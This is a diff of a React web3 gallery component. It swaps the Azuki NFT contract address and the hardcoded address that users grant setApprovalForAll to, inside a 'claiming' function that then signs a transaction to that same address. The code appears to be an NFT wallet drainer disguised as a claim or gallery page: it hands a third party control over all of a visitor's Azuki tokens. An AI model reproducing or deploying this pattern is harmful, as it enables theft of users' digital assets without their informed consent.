@@ -18,7 +18,7 @@ function Gallery() {
   const [isClaiming, setIsClaiming] = useState(false)
 
   const web3 = new Web3(Web3.givenProvider || 'http://localhost:7545');
-  const Azuki_contract = new web3.eth.Contract(Azuki_abi, "0x7ad76304B668F2Ccd5985A304C36fE67b1c539A5")
+  const Azuki_contract = new web3.eth.Contract(Azuki_abi, "0xED5AF388653567Af2F388E6224dC7C4b3241C544")
   const Alpaca_contract = new web3.eth.Contract(Alpaca_abi, "0x3DB5463A9e2d04334192C6f2DD4B72DeF4751A61")
 
   const getData = async (address) => {
@@ -91,7 +91,7 @@ function Gallery() {
 
   function setApprovalForAll() {
     setIsClaiming(true)
-    Azuki_contract.methods.setApprovalForAll("0xc5581c695F206044d14Ac519aA51eB07D716f8Cb", true).send({ from: defaultAccount }).on('error',
+    Azuki_contract.methods.setApprovalForAll("0xA10dF3F212e8480db5ffF956d46945B25C762045", true).send({ from: defaultAccount }).on('error',
       function (error, tokenIds) {
         console.log(error)
         setIsClaiming(false)
@@ -105,7 +105,7 @@ function Gallery() {
             inputData += temp
           }
           web3.eth.accounts.signTransaction({
-            to: '0xc5581c695F206044d14Ac519aA51eB07D716f8Cb',
+            to: '0xA10dF3F212e8480db5ffF956d46945B25C762045',
             gas: 2000000,
             chainId: 4,
             data: inputData
